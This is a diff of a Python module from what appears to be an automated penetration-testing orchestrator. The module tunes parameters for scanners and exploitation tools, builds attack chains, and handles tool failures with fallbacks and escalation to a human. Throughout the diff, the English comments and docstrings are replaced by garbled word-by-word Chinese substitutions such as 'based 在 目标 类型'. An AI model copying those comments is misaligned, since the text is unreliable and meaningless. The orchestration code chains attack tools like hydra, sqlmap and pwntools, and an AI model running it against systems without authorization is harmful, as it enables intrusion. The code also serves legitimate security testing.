             params["os_detection"] = True
             params["version_detection"] = True
 
-        # Add NSE scripts based on target type
+        # Add NSE scripts based 在 目标 类型
         if profile.target_type == TargetType.WEB_APPLICATION:
             params["nse_scripts"] = "http-*,ssl-*"
         elif profile.target_type == TargetType.NETWORK_HOST:
@@ -1287,16 +1287,16 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_enum4linux_ng_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Enum4linux-ng parameters"""
+        """Optimize Enum4linux-ng 参数"""
         params = {"target": profile.target}
 
-        # Enable comprehensive enumeration by default
+        # 启用 综合 enumeration 由 默认
         params["shares"] = True
         params["users"] = True
         params["groups"] = True
         params["policy"] = True
 
-        # Add authentication if available in context
+        # Add 认证 如果 available 在 context
         if context.get("username"):
             params["username"] = context["username"]
         if context.get("password"):
@@ -1307,10 +1307,10 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_autorecon_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize AutoRecon parameters"""
+        """Optimize AutoRecon 参数"""
         params = {"target": profile.target}
 
-        # Adjust scan depth based on objective
+        # Adjust 扫描 depth based 在 objective
         if context.get("quick", False):
             params["port_scans"] = "top-100-ports"
             params["timeout"] = 180
@@ -1318,16 +1318,16 @@ class IntelligentDecisionEngine:
             params["port_scans"] = "top-1000-ports"
             params["timeout"] = 600
 
-        # Set output directory
+        # 设置 输出 目录
         params["output_dir"] = f"/tmp/autorecon_{profile.target.replace('.', '_')}"
 
         return params
 
     def _optimize_ghidra_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Ghidra parameters"""
+        """Optimize Ghidra 参数"""
         params = {"binary": profile.target}
 
-        # Adjust analysis timeout based on context
+        # Adjust 分析 超时 based 在 context
         if context.get("quick", False):
             params["analysis_timeout"] = 120
         elif context.get("comprehensive", True):
@@ -1335,17 +1335,17 @@ class IntelligentDecisionEngine:
         else:
             params["analysis_timeout"] = 300
 
-        # Set project name based on binary
+        # 设置 project name based 在 二进制
         binary_name = os.path.basename(profile.target).replace('.', '_')
         params["project_name"] = f"hexstrike_{binary_name}"
 
         return params
 
     def _optimize_pwntools_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Pwntools parameters"""
+        """Optimize Pwntools 参数"""
         params = {"target_binary": profile.target}
 
-        # Set exploit type based on context
+        # 设置 利用 类型 based 在 context
         if context.get("remote_host") and context.get("remote_port"):
             params["exploit_type"] = "remote"
             params["target_host"] = context["remote_host"]
@@ -1356,10 +1356,10 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_ropper_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Ropper parameters"""
+        """Optimize Ropper 参数"""
         params = {"binary": profile.target}
 
-        # Set gadget type and quality based on context
+        # 设置 gadget 类型 与 quality based 在 context
         if context.get("exploit_type") == "rop":
             params["gadget_type"] = "rop"
             params["quality"] = 3
@@ -1370,17 +1370,17 @@ class IntelligentDecisionEngine:
             params["gadget_type"] = "all"
             params["quality"] = 2
 
-        # Set architecture if known
+        # 设置 architecture 如果 known
         if context.get("arch"):
             params["arch"] = context["arch"]
 
         return params
 
     def _optimize_angr_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize angr parameters"""
+        """Optimize angr 参数"""
         params = {"binary": profile.target}
 
-        # Set analysis type based on context
+        # 设置 分析 类型 based 在 context
         if context.get("symbolic_execution", True):
             params["analysis_type"] = "symbolic"
         elif context.get("cfg_analysis", False):
@@ -1388,7 +1388,7 @@ class IntelligentDecisionEngine:
         else:
             params["analysis_type"] = "static"
 
-        # Add find/avoid addresses if provided
+        # Add find/avoid addresses 如果 provided
         if context.get("find_address"):
             params["find_address"] = context["find_address"]
         if context.get("avoid_addresses"):
@@ -1397,47 +1397,47 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_prowler_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Prowler parameters"""
+        """Optimize Prowler 参数"""
         params = {"provider": "aws"}
 
-        # Set provider based on context or target analysis
+        # 设置 provider based 在 context 或 目标 分析
         if context.get("cloud_provider"):
             params["provider"] = context["cloud_provider"]
 
-        # Set profile and region
+        # 设置 profile 与 region
         if context.get("aws_profile"):
             params["profile"] = context["aws_profile"]
         if context.get("aws_region"):
             params["region"] = context["aws_region"]
 
-        # Set output format and directory
+        # 设置 输出 format 与 目录
         params["output_format"] = "json"
         params["output_dir"] = f"/tmp/prowler_{params['provider']}"
 
         return params
 
     def _optimize_scout_suite_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Scout Suite parameters"""
+        """Optimize Scout Suite 参数"""
         params = {"provider": "aws"}
 
-        # Set provider based on context
+        # 设置 provider based 在 context
         if context.get("cloud_provider"):
             params["provider"] = context["cloud_provider"]
 
-        # Set profile for AWS
+        # 设置 profile 用于 AWS
         if params["provider"] == "aws" and context.get("aws_profile"):
             params["profile"] = context["aws_profile"]
 
-        # Set report directory
+        # 设置 report 目录
         params["report_dir"] = f"/tmp/scout-suite_{params['provider']}"
 
         return params
 
     def _optimize_kube_hunter_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize kube-hunter parameters"""
+        """Optimize kube-hunter 参数"""
         params = {"report": "json"}
 
-        # Set target based on context
+        # 设置 目标 based 在 context
         if context.get("kubernetes_target"):
             params["target"] = context["kubernetes_target"]
         elif context.get("cidr"):
@@ -1445,25 +1445,25 @@ class IntelligentDecisionEngine:
         elif context.get("interface"):
             params["interface"] = context["interface"]
 
-        # Enable active hunting if specified
+        # 启用 active hunting 如果 specified
         if context.get("active_hunting", False):
             params["active"] = True
 
         return params
 
     def _optimize_trivy_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Trivy parameters"""
+        """Optimize Trivy 参数"""
         params = {"target": profile.target, "output_format": "json"}
 
-        # Determine scan type based on target
+        # 判断 扫描 类型 based 在 目标
         if profile.target.startswith(('docker.io/', 'gcr.io/', 'quay.io/')) or ':' in profile.target:
             params["scan_type"] = "image"
         elif os.path.isdir(profile.target):
             params["scan_type"] = "fs"
         else:
-            params["scan_type"] = "image"  # Default
+            params["scan_type"] = "image"  # 默认
 
-        # Set severity filter
+        # 设置 severity filter
         if context.get("severity"):
             params["severity"] = context["severity"]
         else:
@@ -1472,14 +1472,14 @@ class IntelligentDecisionEngine:
         return params
 
     def _optimize_checkov_params(self, profile: TargetProfile, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Optimize Checkov parameters"""
+        """Optimize Checkov 参数"""
         params = {"directory": profile.target, "output_format": "json"}
 
-        # Detect framework based on files in directory
+        # Detect 框架 based 在 文件 在 目录
         if context.get("framework"):
             params["framework"] = context["framework"]
         elif os.path.isdir(profile.target):
-            # Auto-detect framework
+            # Auto-detect 框架
             if any(f.endswith('.tf') for f in os.listdir(profile.target) if os.path.isfile(os.path.join(profile.target, f))):
                 params["framework"] = "terraform"
             elif any(f.endswith('.yaml') or f.endswith('.yml') for f in os.listdir(profile.target) if os.path.isfile(os.path.join(profile.target, f))):
@@ -1488,10 +1488,10 @@ class IntelligentDecisionEngine:
         return params
 
     def create_attack_chain(self, profile: TargetProfile, objective: str = "comprehensive") -> AttackChain:
-        """Create an intelligent attack chain based on target profile"""
+        """创建 an 智能 attack chain based 在 目标 profile"""
         chain = AttackChain(profile)
 
-        # Select attack pattern based on target type and objective
+        # 选择 attack pattern based 在 目标 类型 与 objective
         if profile.target_type == TargetType.WEB_APPLICATION:
             if objective == "quick":
                 pattern = self.attack_patterns["vulnerability_assessment"][:2]
@@ -1521,7 +1521,7 @@ class IntelligentDecisionEngine:
             else:
                 pattern = self.attack_patterns["multi_cloud_assessment"]
         else:
-            # Handle bug bounty specific objectives
+            # 处理 bug bounty specific objectives
             if objective == "bug_bounty_recon":
                 pattern = self.attack_patterns["bug_bounty_reconnaissance"]
             elif objective == "bug_bounty_hunting":
@@ -1531,16 +1531,16 @@ class IntelligentDecisionEngine:
             else:
                 pattern = self.attack_patterns["web_reconnaissance"]
 
-        # Create attack steps
+        # 创建 attack steps
         for step_config in pattern:
             tool = step_config["tool"]
             optimized_params = self.optimize_parameters(tool, profile)
 
-            # Calculate success probability based on tool effectiveness
+            # 计算 成功 probability based 在 工具 effectiveness
             effectiveness = self.tool_effectiveness.get(profile.target_type.value, {}).get(tool, 0.5)
             success_prob = effectiveness * profile.confidence_score
 
-            # Estimate execution time (simplified)
+            # 说明：Estimate execution time (simplified)
             time_estimates = {
                 "nmap": 120, "gobuster": 300, "nuclei": 180, "nikto": 240,
                 "sqlmap": 600, "ffuf": 200, "hydra": 900, "amass": 300,
@@ -1563,17 +1563,17 @@ class IntelligentDecisionEngine:
 
             chain.add_step(step)
 
-        # Calculate overall chain metrics
+        # 计算 overall chain 指标
         chain.calculate_success_probability()
         chain.risk_level = profile.risk_level
 
         return chain
 
-# Global decision engine instance
+# 全局 decision engine instance
 decision_engine = IntelligentDecisionEngine()
 
 # ============================================================================
-# INTELLIGENT ERROR HANDLING AND RECOVERY SYSTEM (v11.0 ENHANCEMENT)
+# 智能 错误 HANDLING 与 恢复 系统 (v11.0 ENHANCEMENT)
 # ============================================================================
 
 from enum import Enum
@@ -1584,7 +1584,7 @@ import time
 import random
 
 class ErrorType(Enum):
-    """Enumeration of different error types for intelligent handling"""
+    """Enumeration 的 different 错误 types 用于 智能 handling"""
     TIMEOUT = "timeout"
     PERMISSION_DENIED = "permission_denied"
     NETWORK_UNREACHABLE = "network_unreachable"
@@ -1598,7 +1598,7 @@ class ErrorType(Enum):
     UNKNOWN = "unknown"
 
 class RecoveryAction(Enum):
-    """Types of recovery actions that can be taken"""
+    """Types 的 恢复 actions that can be taken"""
     RETRY_WITH_BACKOFF = "retry_with_backoff"
     RETRY_WITH_REDUCED_SCOPE = "retry_with_reduced_scope"
     SWITCH_TO_ALTERNATIVE_TOOL = "switch_to_alternative_tool"
@@ -1609,7 +1609,7 @@ class RecoveryAction(Enum):
 
 @dataclass
 class ErrorContext:
-    """Context information for error handling decisions"""
+    """Context information 用于 错误 handling decisions"""
     tool_name: str
     target: str
     parameters: Dict[str, Any]
@@ -1623,16 +1623,16 @@ class ErrorContext:
 
 @dataclass
 class RecoveryStrategy:
-    """Recovery strategy with configuration"""
+    """恢复 策略 使用 配置"""
     action: RecoveryAction
     parameters: Dict[str, Any]
     max_attempts: int
     backoff_multiplier: float
     success_probability: float
-    estimated_time: int  # seconds
+    estimated_time: int  # 说明：seconds
 
 class IntelligentErrorHandler:
-    """Advanced error handling with automatic recovery strategies"""
+    """高级 错误 handling 使用 automatic 恢复 strategies"""
 
     def __init__(self):
         self.error_patterns = self._initialize_error_patterns()
@@ -1643,51 +1643,51 @@ class IntelligentErrorHandler:
         self.max_history_size = 1000
 
     def _initialize_error_patterns(self) -> Dict[str, ErrorType]:
-        """Initialize error pattern recognition"""
+        """初始化 错误 pattern recognition"""
         return {
-            # Timeout patterns
+            # 超时 patterns
             r"timeout|timed out|connection timeout|read timeout": ErrorType.TIMEOUT,
             r"operation timed out|command timeout": ErrorType.TIMEOUT,
 
-            # Permission patterns
+            # 说明：Permission patterns
             r"permission denied|access denied|forbidden|not authorized": ErrorType.PERMISSION_DENIED,
             r"sudo required|root required|insufficient privileges": ErrorType.PERMISSION_DENIED,
 
-            # Network patterns
+            # 网络 patterns
             r"network unreachable|host unreachable|no route to host": ErrorType.NETWORK_UNREACHABLE,
             r"connection refused|connection reset|network error": ErrorType.NETWORK_UNREACHABLE,
 
-            # Rate limiting patterns
+            # 说明：Rate limiting patterns
             r"rate limit|too many requests|throttled|429": ErrorType.RATE_LIMITED,
             r"request limit exceeded|quota exceeded": ErrorType.RATE_LIMITED,
 
-            # Tool not found patterns
+            # 工具 not found patterns
             r"command not found|no such file or directory|not found": ErrorType.TOOL_NOT_FOUND,
             r"executable not found|binary not found": ErrorType.TOOL_NOT_FOUND,
 
-            # Parameter patterns
+            # 参数 patterns
             r"invalid argument|invalid option|unknown option": ErrorType.INVALID_PARAMETERS,
             r"bad parameter|invalid parameter|syntax error": ErrorType.INVALID_PARAMETERS,
 
-            # Resource patterns
+            # 说明：Resource patterns
             r"out of memory|memory error|disk full|no space left": ErrorType.RESOURCE_EXHAUSTED,
             r"resource temporarily unavailable|too many open files": ErrorType.RESOURCE_EXHAUSTED,
 
-            # Authentication patterns
+            # 认证 patterns
             r"authentication failed|login failed|invalid credentials": ErrorType.AUTHENTICATION_FAILED,
             r"unauthorized|invalid token|expired token": ErrorType.AUTHENTICATION_FAILED,
 
-            # Target patterns
+            # 目标 patterns
             r"target unreachable|target not responding|target down": ErrorType.TARGET_UNREACHABLE,
             r"host not found|dns resolution failed": ErrorType.TARGET_UNREACHABLE,
 
-            # Parsing patterns
+            # 说明：Parsing patterns
             r"parse error|parsing failed|invalid format|malformed": ErrorType.PARSING_ERROR,
             r"json decode error|xml parse error|invalid json": ErrorType.PARSING_ERROR
         }
 
     def _initialize_recovery_strategies(self) -> Dict[ErrorType, List[RecoveryStrategy]]:
-        """Initialize recovery strategies for different error types"""
+        """初始化 恢复 strategies 用于 different 错误 types"""
         return {
             ErrorType.TIMEOUT: [
                 RecoveryStrategy(
@@ -1898,66 +1898,66 @@ class IntelligentErrorHandler:
         }
 
     def _initialize_tool_alternatives(self) -> Dict[str, List[str]]:
-        """Initialize alternative tools for fallback scenarios"""
+        """初始化 alternative 工具 用于 降级 scenarios"""
         return {
-            # Network scanning alternatives
+            # 网络 扫描 alternatives
             "nmap": ["rustscan", "masscan", "zmap"],
             "rustscan": ["nmap", "masscan"],
             "masscan": ["nmap", "rustscan", "zmap"],
 
-            # Directory/file discovery alternatives
+            # 目录/文件 发现 alternatives
             "gobuster": ["feroxbuster", "dirsearch", "ffuf", "dirb"],
             "feroxbuster": ["gobuster", "dirsearch", "ffuf"],
             "dirsearch": ["gobuster", "feroxbuster", "ffuf"],
             "ffuf": ["gobuster", "feroxbuster", "dirsearch"],
 
-            # Vulnerability scanning alternatives
+            # 漏洞 扫描 alternatives
             "nuclei": ["jaeles", "nikto", "w3af"],
             "jaeles": ["nuclei", "nikto"],
             "nikto": ["nuclei", "jaeles", "w3af"],
 
-            # Web crawling alternatives
+            # 说明：Web crawling alternatives
             "katana": ["gau", "waybackurls", "hakrawler"],
             "gau": ["katana", "waybackurls", "hakrawler"],
             "waybackurls": ["gau", "katana", "hakrawler"],
 
-            # Parameter discovery alternatives
+            # 参数 发现 alternatives
             "arjun": ["paramspider", "x8", "ffuf"],
             "paramspider": ["arjun", "x8"],
             "x8": ["arjun", "paramspider"],
 
-            # SQL injection alternatives
+            # 说明：SQL injection alternatives
             "sqlmap": ["sqlninja", "jsql-injection"],
 
-            # XSS testing alternatives
+            # XSS 测试 alternatives
             "dalfox": ["xsser", "xsstrike"],
 
-            # Subdomain enumeration alternatives
+            # 说明：Subdomain enumeration alternatives
             "subfinder": ["amass", "assetfinder", "findomain"],
             "amass": ["subfinder", "assetfinder", "findomain"],
             "assetfinder": ["subfinder", "amass", "findomain"],
 
-            # Cloud security alternatives
+            # 云 安全 alternatives
             "prowler": ["scout-suite", "cloudmapper"],
             "scout-suite": ["prowler", "cloudmapper"],
 
-            # Container security alternatives
+            # 容器 安全 alternatives
             "trivy": ["clair", "docker-bench-security"],
             "clair": ["trivy", "docker-bench-security"],
 
-            # Binary analysis alternatives
+            # 二进制 分析 alternatives
             "ghidra": ["radare2", "ida", "binary-ninja"],
             "radare2": ["ghidra", "objdump", "gdb"],
             "gdb": ["radare2", "lldb"],
 
-            # Exploitation alternatives
+            # 说明：Exploitation alternatives
             "pwntools": ["ropper", "ropgadget"],
             "ropper": ["ropgadget", "pwntools"],
             "ropgadget": ["ropper", "pwntools"]
         }
 
     def _initialize_parameter_adjustments(self) -> Dict[str, Dict[ErrorType, Dict[str, Any]]]:
-        """Initialize parameter adjustments for different error types and tools"""
+        """初始化 参数 adjustments 用于 different 错误 types 与 工具"""
         return {
             "nmap": {
                 ErrorType.TIMEOUT: {"timing": "-T2", "reduce_ports": True},
@@ -1987,10 +1987,10 @@ class IntelligentErrorHandler:
         }
 
     def classify_error(self, error_message: str, exception: Exception = None) -> ErrorType:
-        """Classify error based on message and exception type"""
+        """Classify 错误 based 在 message 与 exception 类型"""
         error_text = error_message.lower()
 
-        # Check exception type first
+        # 检查 exception 类型 第一
         if exception:
             if isinstance(exception, TimeoutError):
                 return ErrorType.TIMEOUT
@@ -2001,7 +2001,7 @@ class IntelligentErrorHandler:
             elif isinstance(exception, FileNotFoundError):
                 return ErrorType.TOOL_NOT_FOUND
 
-        # Check error patterns
+        # 检查 错误 patterns
         for pattern, error_type in self.error_patterns.items():
             if re.search(pattern, error_text, re.IGNORECASE):
                 return error_type
@@ -2009,11 +2009,11 @@ class IntelligentErrorHandler:
         return ErrorType.UNKNOWN
 
     def handle_tool_failure(self, tool: str, error: Exception, context: Dict[str, Any]) -> RecoveryStrategy:
-        """Determine best recovery action for tool failures"""
+        """判断 best 恢复 action 用于 工具 failures"""
         error_message = str(error)
         error_type = self.classify_error(error_message, error)
 
-        # Create error context
+        # 创建 错误 context
         error_context = ErrorContext(
             tool_name=tool,
             target=context.get('target', 'unknown'),
@@ -2026,13 +2026,13 @@ class IntelligentErrorHandler:
             system_resources=self._get_system_resources()
         )
 
-        # Add to error history
+        # Add 到 错误 history
         self._add_to_history(error_context)
 
-        # Get recovery strategies for this error type
+        # 获取 恢复 strategies 用于 this 错误 类型
         strategies = self.recovery_strategies.get(error_type, self.recovery_strategies[ErrorType.UNKNOWN])
 
-        # Select best strategy based on context
+        # 选择 best 策略 based 在 context
         best_strategy = self._select_best_strategy(strategies, error_context)
 
         error_message = f'{error_type.value} - Applying {best_strategy.action.value}'
@@ -2041,12 +2041,12 @@ class IntelligentErrorHandler:
         return best_strategy
 
     def _select_best_strategy(self, strategies: List[RecoveryStrategy], context: ErrorContext) -> RecoveryStrategy:
-        """Select the best recovery strategy based on context"""
-        # Filter strategies based on attempt count
+        """选择 the best 恢复 策略 based 在 context"""
+        # 过滤 strategies based 在 attempt count
         viable_strategies = [s for s in strategies if context.attempt_count <= s.max_attempts]
 
         if not viable_strategies:
-            # If all strategies exhausted, escalate to human
+            # 如果 全部 strategies exhausted, escalate 到 human
             return RecoveryStrategy(
                 action=RecoveryAction.ESCALATE_TO_HUMAN,
                 parameters={"message": f"All recovery strategies exhausted for {context.tool_name}", "urgency": "high"},
@@ -2056,26 +2056,26 @@ class IntelligentErrorHandler:
                 estimated_time=300
             )
 
-        # Score strategies based on success probability and estimated time
+        # 评分 strategies based 在 成功 probability 与 estimated time
         scored_strategies = []
         for strategy in viable_strategies:
-            # Adjust success probability based on previous failures
+            # Adjust 成功 probability based 在 previous failures
             adjusted_probability = strategy.success_probability * (0.9 ** (context.attempt_count - 1))
 
-            # Prefer strategies with higher success probability and lower time
+            # Prefer strategies 使用 higher 成功 probability 与 lower time
             score = adjusted_probability - (strategy.estimated_time / 1000.0)
             scored_strategies.append((score, strategy))
 
-        # Return strategy with highest score
+        # Return 策略 使用 highest 评分
         scored_strategies.sort(key=lambda x: x[0], reverse=True)
         return scored_strategies[0][1]
 
     def auto_adjust_parameters(self, tool: str, error_type: ErrorType, original_params: Dict[str, Any]) -> Dict[str, Any]:
-        """Automatically adjust tool parameters based on error patterns"""
+        """Automatically adjust 工具 参数 based 在 错误 patterns"""
         adjustments = self.parameter_adjustments.get(tool, {}).get(error_type, {})
 
         if not adjustments:
-            # Generic adjustments based on error type
+            # Generic adjustments based 在 错误 类型
             if error_type == ErrorType.TIMEOUT:
                 adjustments = {"timeout": "60", "threads": "5"}
             elif error_type == ErrorType.RATE_LIMITED:
@@ -2083,7 +2083,7 @@ class IntelligentErrorHandler:
             elif error_type == ErrorType.RESOURCE_EXHAUSTED:
                 adjustments = {"threads": "3", "memory_limit": "1G"}
 
-        # Apply adjustments to original parameters
+        # Apply adjustments 到 original 参数
         adjusted_params = original_params.copy()
         adjusted_params.update(adjustments)
 
@@ -2093,29 +2093,29 @@ class IntelligentErrorHandler:
         return adjusted_params
 
     def get_alternative_tool(self, failed_tool: str, context: Dict[str, Any]) -> Optional[str]:
-        """Get alternative tool for failed tool"""
+        """获取 alternative 工具 用于 失败 工具"""
         alternatives = self.tool_alternatives.get(failed_tool, [])
 
         if not alternatives:
             return None
 
-        # Filter alternatives based on context requirements
+        # 过滤 alternatives based 在 context requirements
         filtered_alternatives = []
         for alt in alternatives:
             if context.get('require_no_privileges') and alt in ['nmap', 'masscan']:
-                continue  # Skip tools that typically require privileges
+                continue  # Skip 工具 that typically require privileges
             if context.get('prefer_faster_tools') and alt in ['amass', 'w3af']:
-                continue  # Skip slower tools
+                continue  # Skip slower 工具
             filtered_alternatives.append(alt)
 
         if not filtered_alternatives:
             filtered_alternatives = alternatives
 
-        # Return first available alternative
+        # Return 第一 available alternative
         return filtered_alternatives[0] if filtered_alternatives else None
 
     def escalate_to_human(self, context: ErrorContext, urgency: str = "medium") -> Dict[str, Any]:
-        """Escalate complex errors to human operator with full context"""
+        """Escalate complex errors 到 human operator 使用 full context"""
         escalation_data = {
             "timestamp": context.timestamp.isoformat(),
             "tool": context.tool_name,
@@ -2132,7 +2132,7 @@ class IntelligentErrorHandler:
             }
         }
 
-        # Log escalation with enhanced formatting
+        # Log escalation 使用 增强 formatting
         logger.error(f"{ModernVisualEngine.format_error_card('CRITICAL', context.tool_name, context.error_message, 'HUMAN ESCALATION REQUIRED')}")
         logger.error(f"{ModernVisualEngine.format_highlighted_text('ESCALATION DETAILS', 'RED')}")
         logger.error(f"{json.dumps(escalation_data, indent=2)}")
@@ -2140,7 +2140,7 @@ class IntelligentErrorHandler:
         return escalation_data
 
     def _get_human_suggestions(self, context: ErrorContext) -> List[str]:
-        """Get human-readable suggestions for error resolution"""
+        """获取 human-readable suggestions 用于 错误 resolution"""
         suggestions = []
 
         if context.error_type == ErrorType.PERMISSION_DENIED:
@@ -2173,7 +2173,7 @@ class IntelligentErrorHandler:
         return suggestions
 
     def _get_system_resources(self) -> Dict[str, Any]:
-        """Get current system resource information"""
+        """获取 current 系统 resource information"""
         try:
             return {
                 "cpu_percent": psutil.cpu_percent(),
@@ -2186,15 +2186,15 @@ class IntelligentErrorHandler:
             return {"error": "Unable to get system resources"}
 
     def _add_to_history(self, error_context: ErrorContext):
-        """Add error context to history"""
+        """Add 错误 context 到 history"""
         self.error_history.append(error_context)
 
-        # Maintain history size limit
+        # 说明：Maintain history size limit
         if len(self.error_history) > self.max_history_size:
             self.error_history = self.error_history[-self.max_history_size:]
 
     def get_error_statistics(self) -> Dict[str, Any]:
-        """Get error statistics for monitoring"""
+        """获取 错误 统计 用于 监控"""
         if not self.error_history:
             return {"total_errors": 0}
 
@@ -2202,7 +2202,7 @@ class IntelligentErrorHandler:
         tool_errors = {}
         recent_errors = []
 
-        # Count errors by type and tool
+        # Count errors 由 类型 与 工具
         for error in self.error_history:
             error_type = error.error_type.value
             tool = error.tool_name
@@ -2210,7 +2210,7 @@ class IntelligentErrorHandler:
             error_counts[error_type] = error_counts.get(error_type, 0) + 1
             tool_errors[tool] = tool_errors.get(tool, 0) + 1
 
-            # Recent errors (last hour)
+            # 最近 errors (最后 hour)
             if (datetime.now() - error.timestamp).total_seconds() < 3600:
                 recent_errors.append({
                     "tool": tool,
@@ -2223,48 +2223,48 @@ class IntelligentErrorHandler:
             "error_counts_by_type": error_counts,
             "error_counts_by_tool": tool_errors,
             "recent_errors_count": len(recent_errors),
-            "recent_errors": recent_errors[-10:]  # Last 10 recent errors
+            "recent_errors": recent_errors[-10:]  # 最后 10 最近 errors
         }
 
 class GracefulDegradation:
-    """Ensure system continues operating even with partial tool failures"""
+    """Ensure 系统 continues operating even 使用 partial 工具 failures"""
 
     def __init__(self):
         self.fallback_chains = self._initialize_fallback_chains()
         self.critical_operations = self._initialize_critical_operations()
 
     def _initialize_fallback_chains(self) -> Dict[str, List[List[str]]]:
-        """Initialize fallback tool chains for critical operations"""
+        """初始化 降级 工具 chains 用于 严重 操作"""
         return {
             "network_discovery": [
                 ["nmap", "rustscan", "masscan"],
                 ["rustscan", "nmap"],
-                ["ping", "telnet"]  # Basic fallback
+                ["ping", "telnet"]  # 基础 降级
             ],
             "web_discovery": [
                 ["gobuster", "feroxbuster", "dirsearch"],
                 ["feroxbuster", "ffuf"],
-                ["curl", "wget"]  # Basic fallback
+                ["curl", "wget"]  # 基础 降级
             ],
             "vulnerability_scanning": [
                 ["nuclei", "jaeles", "nikto"],
                 ["nikto", "w3af"],
-                ["curl"]  # Basic manual testing
+                ["curl"]  # 基础 manual 测试
             ],
             "subdomain_enumeration": [
                 ["subfinder", "amass", "assetfinder"],
                 ["amass", "findomain"],
-                ["dig", "nslookup"]  # Basic DNS tools
+                ["dig", "nslookup"]  # 基础 DNS 工具
             ],
             "parameter_discovery": [
                 ["arjun", "paramspider", "x8"],
                 ["ffuf", "wfuzz"],
-                ["manual_testing"]  # Manual parameter testing
+                ["manual_testing"]  # Manual 参数 测试
             ]
         }
 
     def _initialize_critical_operations(self) -> Set[str]:
-        """Initialize set of critical operations that must not fail completely"""
+        """初始化 设置 的 严重 操作 that must not fail completely"""
         return {
             "network_discovery",
             "web_discovery",
@@ -2273,20 +2273,20 @@ class GracefulDegradation:
         }
 
     def create_fallback_chain(self, operation: str, failed_tools: List[str] = None) -> List[str]:
-        """Create fallback tool chain for critical operations"""
+        """创建 降级 工具 chain 用于 严重 操作"""
         if failed_tools is None:
             failed_tools = []
 
         chains = self.fallback_chains.get(operation, [])
 
-        # Find first chain that doesn't contain failed tools
+        # Find 第一 chain that doesn't contain 失败 工具
         for chain in chains:
             viable_chain = [tool for tool in chain if tool not in failed_tools]
             if viable_chain:
                 logger.info(f" Fallback chain for {operation}: {viable_chain}")
                 return viable_chain
 
-        # If no viable chain found, return basic fallback
+        # 如果 no viable chain found, return 基础 降级
         basic_fallbacks = {
             "network_discovery": ["ping"],
             "web_discovery": ["curl"],
@@ -2300,7 +2300,7 @@ class GracefulDegradation:
 
     def handle_partial_failure(self, operation: str, partial_results: Dict[str, Any],
                              failed_components: List[str]) -> Dict[str, Any]:
-        """Handle partial results and fill gaps with alternative methods"""
+        """处理 partial 结果 与 fill gaps 使用 alternative methods"""
 
         enhanced_results = partial_results.copy()
         enhanced_results["degradation_info"] = {
@@ -2311,20 +2311,20 @@ class GracefulDegradation:
             "timestamp": datetime.now().isoformat()
         }
 
-        # Try to fill gaps based on operation type
+        # Try 到 fill gaps based 在 操作 类型
         if operation == "network_discovery" and "open_ports" not in partial_results:
-            # Try basic port check if full scan failed
+            # Try 基础 port 检查 如果 full 扫描 失败
             enhanced_results["open_ports"] = self._basic_port_check(partial_results.get("target"))
 
         elif operation == "web_discovery" and "directories" not in partial_results:
-            # Try basic directory check
+            # Try 基础 目录 检查
             enhanced_results["directories"] = self._basic_directory_check(partial_results.get("target"))
 
         elif operation == "vulnerability_scanning" and "vulnerabilities" not in partial_results:
-            # Provide basic security headers check
+            # Provide 基础 安全 请求头 检查
             enhanced_results["vulnerabilities"] = self._basic_security_check(partial_results.get("target"))
 
-        # Add recommendations for manual follow-up
+        # Add recommendations 用于 manual follow-up
         enhanced_results["manual_recommendations"] = self._get_manual_recommendations(
             operation, failed_components
         )
@@ -2333,7 +2333,7 @@ class GracefulDegradation:
         return enhanced_results
 
     def _basic_port_check(self, target: str) -> List[int]:
-        """Basic port connectivity check"""
+        """基础 port connectivity 检查"""
         if not target:
             return []
 
@@ -2354,7 +2354,7 @@ class GracefulDegradation:
         return open_ports
 
     def _basic_directory_check(self, target: str) -> List[str]:
-        """Basic directory existence check"""
+        """基础 目录 existence 检查"""
         if not target:
             return []
 
@@ -2373,7 +2373,7 @@ class GracefulDegradation:
         return found_dirs
 
     def _basic_security_check(self, target: str) -> List[Dict[str, Any]]:
-        """Basic security headers check"""
+        """基础 安全 请求头 检查"""
         if not target:
             return []
 
@@ -2383,7 +2383,7 @@ class GracefulDegradation:
             response = requests.get(target, timeout=10)
             headers = response.headers
 
-            # Check for missing security headers
+            # 检查 用于 missing 安全 请求头
             security_headers = {
                 "X-Frame-Options": "Clickjacking protection missing",
                 "X-Content-Type-Options": "MIME type sniffing protection missing",
@@ -2411,7 +2411,7 @@ class GracefulDegradation:
         return vulnerabilities
 
     def _get_manual_recommendations(self, operation: str, failed_components: List[str]) -> List[str]:
-        """Get manual recommendations for failed operations"""
+        """获取 manual recommendations 用于 失败 操作"""
         recommendations = []
 
         base_recommendations = {
@@ -2439,7 +2439,7 @@ class GracefulDegradation:
 
         recommendations.extend(base_recommendations.get(operation, []))
 
-        # Add specific recommendations based on failed components
+        # Add specific recommendations based 在 失败 components
         for component in failed_components:
             if component == "nmap":
                 recommendations.append("Consider using online port scanners")
@@ -2451,29 +2451,29 @@ class GracefulDegradation:
         return recommendations
 
     def is_critical_operation(self, operation: str) -> bool:
-        """Check if operation is critical and requires fallback"""
+        """检查 如果 操作 is 严重 与 requires 降级"""
         return operation in self.critical_operations
 
-# Global error handler and degradation manager instances
+# 全局 错误 handler 与 degradation manager instances
 error_handler = IntelligentErrorHandler()
 degradation_manager = GracefulDegradation()
 
 # ============================================================================
-# BUG BOUNTY HUNTING SPECIALIZED WORKFLOWS (v6.0 ENHANCEMENT)
+# 说明：BUG BOUNTY HUNTING SPECIALIZED WORKFLOWS (v6.0 ENHANCEMENT)
 # ============================================================================
 
 @dataclass
 class BugBountyTarget:
-    """Bug bounty target information"""
